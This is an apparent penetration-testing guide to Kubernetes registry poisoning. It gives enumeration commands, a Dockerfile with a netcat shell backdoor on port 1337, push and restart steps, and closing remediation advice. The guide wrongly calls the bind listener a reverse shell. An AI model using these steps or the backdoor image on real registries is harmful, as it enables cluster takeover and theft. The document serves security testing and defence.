# Kubernetes Registry Poisoning Attack

## 1. Overview

**Attack Vector Description:**

Registry poisoning is a type of supply chain attack that targets container registries used by Kubernetes clusters. Attackers aim to inject malicious container images (backdoored, trojaned, or containing vulnerabilities) into the registry under names that legitimate applications might use. When Kubernetes deploys an application, it pulls the image from the registry. If an attacker has poisoned the registry, the cluster will inadvertently deploy the compromised image instead of the intended, safe image.

**Potential Impact and Consequences:**

*   **Complete cluster compromise:** Malicious images can contain backdoors that allow attackers to gain root access to the nodes within the Kubernetes cluster.
*   **Data exfiltration:** Compromised images can be designed to steal sensitive data stored within the cluster.
*   **Denial of service:** Malicious images can consume excessive resources, rendering the applications and cluster unavailable.
*   **Application malfunction:** Backdoored images can cause applications to behave unexpectedly, leading to incorrect results or data corruption.
*   **Reputational damage:** If the compromise leads to data breaches or service outages, the organization's reputation can be severely damaged.

**Risk Level Assessment:**

**Critical** - Due to the potential for complete cluster compromise and significant impact.

**Technical Explanation of Why This Vulnerability Exists:**

This vulnerability exists because of several factors:

*   **Lack of image integrity verification:** Kubernetes, by default, doesn't always mandate or enforce strong image integrity checks (e.g., content trust via Docker Content Trust).  If not explicitly configured, the cluster will pull any image with the specified name and tag from the configured registry.
*   **Weak registry access control:** Insufficiently secured registries allow unauthorized users (attackers) to push images, either by exploiting vulnerabilities in the registry itself or through compromised credentials.
*   **Namespace confusion:** Attackers can leverage naming conventions and misconfigurations in Kubernetes namespaces to trick the cluster into pulling images from unexpected sources. For example, pushing an image to a registry with the same name as a legitimate image but in a different namespace or organization.
*   **Tag mutability:**  Allowing tags to be mutable can be abused, allowing attackers to overwrite a good image with a compromised one using the same tag.

**Prerequisites and Conditions Needed:**

*   Access to a Kubernetes cluster (even a local Minikube setup is sufficient for testing).
*   Access to the container registry used by the Kubernetes cluster (either read-only to identify potentially vulnerable images or, ideally, write access to simulate an actual attack).
*   Basic understanding of Kubernetes concepts (pods, deployments, services).
*   `kubectl` command-line tool configured to interact with the Kubernetes cluster.
*   `docker` or `podman` installed for building and pushing container images.
*   Familiarity with container registries like Docker Hub, Google Container Registry (GCR), Amazon Elastic Container Registry (ECR).

## 2. Validation and Exploitation Steps

**Phase 1: Validation - Identifying Potential Vulnerabilities**

**Step 1: Enumerate the Container Images Used by the Cluster**

```bash
kubectl get pods --all-namespaces -o yaml | grep image:
```

**Explanation:** This command retrieves all pods across all namespaces, extracts the YAML configuration, and filters the output to show the `image:` lines.

**Why:** This step is crucial for identifying the container images the cluster is currently using.  We need this list to understand what images are potential targets for poisoning.

**Expected Output:** A list of image names and tags used by the cluster, for example:

```
    image: nginx:latest
    image: gcr.io/google-samples/hello-app:1.0
    image: your-private-registry.com/my-app:v1
```

**What to Look For:** Note down the images and their registries. Look for publicly available images without specific tags (`:latest` is a red flag) or images from registries you suspect might have weak access controls.

**Step 2: Inspect Registry Access Permissions (If Possible)**

This step is dependent on your access to the registry. You'll want to investigate how authentication and authorization are configured.

*   **Docker Hub:** If using Docker Hub, check for repository visibility (Public vs. Private) and collaborator permissions.
*   **GCR/ECR:** Check IAM roles and policies associated with the registries to understand who has permission to push images.
*   **Private registries:** Examine the registry's configuration (e.g., using its API) to understand authentication and authorization mechanisms.  Common misconfigurations include using default passwords or allowing anonymous access.

**Explanation:** Assess the security posture of the registry itself.

**Why:** Weak registry access controls are a primary enabler of registry poisoning.

**Expected Output:** Configuration details regarding registry access controls (e.g., list of users with push access, public vs. private repository settings).

**What to Look For:** Any indication of weak access control configurations. Anonymous push access or over-permissive IAM roles/policies are critical vulnerabilities.

**Step 3: Check ImagePullPolicy (Optional - For Deeper Analysis)**

```bash
kubectl get deployments --all-namespaces -o yaml | grep imagePullPolicy:
kubectl get statefulsets --all-namespaces -o yaml | grep imagePullPolicy:
```

**Explanation:** These commands retrieve the YAML configuration for deployments and statefulsets and filter the output for the `imagePullPolicy` setting.

**Why:**  The `imagePullPolicy` dictates when Kubernetes attempts to pull a new image. If set to `IfNotPresent`, it will only pull the image if it's not already present locally.  An attacker who can pre-populate the local image cache with a malicious image could potentially bypass registry checks (this is less effective if images are always pulled remotely).

**Expected Output:** Values for `imagePullPolicy` for each deployment and statefulset.

**What to Look For:** `IfNotPresent` values that, in combination with other vulnerabilities, could exacerbate the impact.

**Phase 2: Exploitation - Demonstrating a Registry Poisoning Attack**

**Assumptions:**

*   We have identified an image name used by the cluster: `your-private-registry.com/my-app:v1`.
*   We have discovered or gained access that allows us to push images to `your-private-registry.com`.

**Step 4: Create a Malicious Container Image**

```dockerfile
FROM ubuntu:latest

# Install a backdoor (example: netcat)
RUN apt-get update && apt-get install -y netcat

# Expose a port for the backdoor
EXPOSE 1337

# Command to execute when the container starts
CMD ["/bin/bash", "-c", "nc -lvp 1337 -e /bin/sh"]
```

**Explanation:** This Dockerfile creates a simple Ubuntu-based image with `netcat` installed and configured to listen on port 1337, providing a reverse shell.  **This is a simplified example; a real-world attack would likely involve more sophisticated malware.**

**Why:** This image represents the malicious payload that will be injected into the registry.

**Step 5: Build and Tag the Malicious Image**

```bash
docker build -t malicious-app .
docker tag malicious-app your-private-registry.com/my-app:v1
```

**Explanation:**
*   `docker build -t malicious-app .`: Builds the image from the Dockerfile and tags it as `malicious-app`.
*   `docker tag malicious-app your-private-registry.com/my-app:v1`:  Tags the `malicious-app` image with the same name and tag as the legitimate image being used by the cluster (`your-private-registry.com/my-app:v1`). **This is the core of the poisoning attack.**

**Why:** By using the same name and tag, we are preparing to overwrite or replace the original image in the registry.

**Step 6: Push the Malicious Image to the Registry**

```bash
docker push your-private-registry.com/my-app:v1
```

**Explanation:** This command pushes the tagged malicious image to the container registry.  This step assumes you have the necessary credentials configured for `docker login` or equivalent authentication mechanism for your registry.

**Why:** This step overwrites or replaces the legitimate image with the malicious one in the registry, completing the poisoning attack.

**Expected Output:** Success message from the `docker push` command indicating that the image has been successfully uploaded to the registry.

**Step 7: Trigger a Pod Restart or Redeployment (to Pull the Poisoned Image)**

```bash
kubectl rollout restart deployment/my-app -n my-namespace
```

**Explanation:** This command restarts the `my-app` deployment in the `my-namespace` namespace.  This forces Kubernetes to pull the image from the registry.  Adjust the namespace and deployment name to match your target application.

**Why:** By restarting the deployment, we force Kubernetes to pull the (now poisoned) image from the registry and deploy a new pod using the malicious image.

**Expected Output:** The pod restarts and starts using the newly deployed (malicious) image.

**Step 8: Verify the Exploit (Connect to the Backdoor)**

```bash
kubectl get pods -n my-namespace # Get the name of the newly deployed pod
kubectl exec -it <pod-name> -n my-namespace -- /bin/bash # Or nc to localhost on exposed port, if applicable.
```
Alternatively, if the image has an exposed port (like our netcat example):
```bash
kubectl port-forward <pod-name> 1337:1337 -n my-namespace
nc localhost 1337
```

**Explanation:**
*   `kubectl get pods -n my-namespace`: Retrieves the name of the newly deployed pod.
*   `kubectl exec -it <pod-name> -n my-namespace -- /bin/bash`: Opens an interactive shell inside the pod. Replace `<pod-name>` with the actual pod name.
*   Alternatively, `kubectl port-forward` exposes port 1337 from the pod to your local machine, allowing you to connect to the netcat backdoor.

**Why:** This step confirms that the malicious image has been successfully deployed and that the backdoor is active.  If you can access a shell or connect to the exposed port, the exploit is successful.

**Expected Output:**  A shell prompt inside the pod, indicating that you have successfully connected to the backdoor. Or a successful netcat connection.

**Potential Variations and Alternative Approaches:**

*   **Tag Manipulation:** Instead of overwriting a tag, an attacker might push a new tag with a similar name (e.g., `v1-staging`) to trick users into accidentally using the malicious image.
*   **Namespace Confusion:** If a Kubernetes cluster uses multiple registries based on namespaces, an attacker might exploit misconfigurations to push an image to the wrong registry, causing the cluster to pull it unintentionally.
*   **Automated Exploitation:** This process can be automated using scripts that identify vulnerable images, build malicious images, push them to the registry, and trigger restarts.

**Remediation Recommendations:**

*   **Implement Image Content Trust (Docker Content Trust):** Digitally sign and verify images using Docker Content Trust to ensure their integrity and authenticity.
*   **Enforce Strong Access Controls on Container Registries:** Implement robust authentication and authorization mechanisms to restrict who can push images to the registry.  Follow the principle of least privilege.
*   **Use Image Scanning Tools:** Integrate image scanning tools into your CI/CD pipeline to detect vulnerabilities in container images before they are deployed to the cluster.
*   **Implement Admission Controllers:** Use admission controllers to enforce policies that prevent the deployment of images from untrusted registries or without proper signatures.  Kyverno and OPA (Open Policy Agent) are excellent options.
*   **Use Namespaces Effectively:** Enforce strict namespace isolation and ensure that applications only pull images from their designated registries.
*   **Monitor Registry Activity:** Monitor registry logs for suspicious activity, such as unauthorized image pushes or pulls.
*   **Regularly Update Images:** Keep your container images up to date to patch known vulnerabilities.
*   **Immutable Tags:** Avoid using mutable tags (like `latest`).  Use specific versioned tags and update deployments accordingly.
*   **Principle of Least Privilege:** Grant only the necessary permissions to service accounts and users that interact with the container registry and Kubernetes API.

By following these recommendations, you can significantly reduce the risk of registry poisoning attacks and improve the overall security of your Kubernetes cluster.
